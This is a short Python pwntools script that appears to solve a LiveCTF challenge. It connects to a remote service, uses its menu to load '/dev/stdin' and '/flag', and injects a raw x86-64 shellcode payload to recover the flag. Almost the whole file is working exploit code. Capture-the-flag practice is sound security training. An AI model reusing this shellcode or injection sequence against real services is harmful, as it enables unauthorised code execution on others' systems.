from pwn import *
import time

HOST = os.environ.get('HOST', 'localhost')
PORT = os.environ.get('PORT', '31337')

r = remote(HOST, int(PORT))

shellcode = b'H\213\354\350\35\0\0\0\213\370j<X\17\5VWUH\213\354\213\3703\300H\213\362H\213\321\17\5\311_^\303SVUH\213\354H\215\244$\0\376\377\377j@Y\201\371\200\0\0\0|\a\353 \203\301\1\353\361Hc\301H\213\204\305\0\376\377\377H%\377\17\0\0H=\201\t\0\0t\2\353\340\203\301\6Hc\301H\213\264\305\0\376\377\377H\213\306H\203\300\4\307\0\1\0\0\0H\213\306H\203\300\b\307\0\0\0\0\0H\213\326H\203\302\fj\5Xj@Y\350u\377\377\377H\213\336H\203\303Pj\0\217\3H\213\336H\203\303XH\307\3\25\315[\a\311^[\303'

r.recvuntil(b"Choice: ")
r.sendline(b"1")
r.sendline(b"/dev/stdin")
r.send(b"\xc3")
time.sleep(1)

r.recvuntil(b"Choice: ")
r.sendline(b"1")
r.sendline(b"/flag")
time.sleep(1)

r.recvuntil(b"Choice: ")
r.sendline(b"1")
r.sendline(b"/dev/stdin")
r.send(shellcode)
time.sleep(1)

r.sendline(b"2")
# r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
